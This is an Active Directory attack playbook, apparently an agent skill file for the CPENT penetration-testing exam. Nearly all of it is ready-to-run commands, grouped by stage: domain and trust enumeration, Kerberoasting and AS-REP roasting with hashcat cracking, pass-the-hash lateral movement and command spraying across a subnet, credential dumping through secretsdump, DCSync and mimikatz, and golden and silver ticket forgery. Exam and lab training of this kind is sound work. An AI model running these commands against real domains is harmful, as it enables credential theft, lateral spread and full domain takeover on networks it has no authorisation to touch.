---
name: active-directory
description: Active Directory attack playbook for CPENT Zone 2 — enumeration, Kerberos roasting (incl. cross-forest), lateral movement, credential extraction, and domain dominance. Use once you have pivoted into the domain. Covers CPENT v2 cross-forest trust scenarios.
---

# Active Directory (Zone 2, 15%)

AD is **not reachable from outside** — pivot in first (`pivoting` skill). Then the chain is:
enumerate → harvest creds → lateral → privesc → domain admin. CPENT v2 adds **cross-forest**
scenarios, so enumerate trusts and try roasting across them.

Keep a running credential file — reuse is rampant (`bin/cpent cred add/list`).

## Enumerate

```
bloodhound-python -u <u> -p <p> -d <domain> -c all -ns <dc-ip>     # attack paths
crackmapexec smb <dc-ip> -u <u> -p <p> --users --groups --shares
GetADUsers.py <domain>/<u>:<p> -dc-ip <dc-ip> -all
# trusts (cross-forest): nltest /domain_trusts   |  bloodhound "Enabled"+trust edges
```

## Kerberos — easy early wins, always try

```
# Kerberoast (SPN accounts) — crack -m 13100
GetUserSPNs.py <domain>/<u>:<p> -request -dc-ip <dc-ip>
# across a forest trust: add -target-domain <trusted.forest>
# AS-REP roast (no-preauth users) — crack -m 18200
GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <dc-ip>
hashcat -m 13100 hash.txt wordlist      # or -m 18200 for AS-REP
```

## Lateral movement

```
psexec.py -hashes :<ntlm> <domain>/<u>@<t>        # pass-the-hash
wmiexec.py <domain>/<u>:<p>@<t>
evil-winrm -i <t> -u <u> -H <hash>
crackmapexec smb <subnet>/24 -u <u> -H <hash> -x 'whoami'   # spray + exec
```

## Credential extraction

```
secretsdump.py <domain>/<admin>@<dc-ip>           # remote SAM/LSA/NTDS
secretsdump.py -just-dc <domain>/<u>@<dc-ip>      # DCSync (needs replication rights)
# on-host: mimikatz  sekurlsa::logonpasswords ; lsadump::dcsync /user:krbtgt
```

## Domain dominance

- **Golden Ticket:** forge TGT with krbtgt hash + domain SID → anything.
- **Silver Ticket:** forge a service ticket with the service account hash.
- Delegation abuse (unconstrained / constrained / RBCD), GPO abuse.
- **Cross-forest:** with a trust key or a foreign admin, repeat roasting/lateral in the
  trusted domain; forge inter-realm tickets where the trust allows.

Write a finding for each foothold, DA, and each cracked hash.
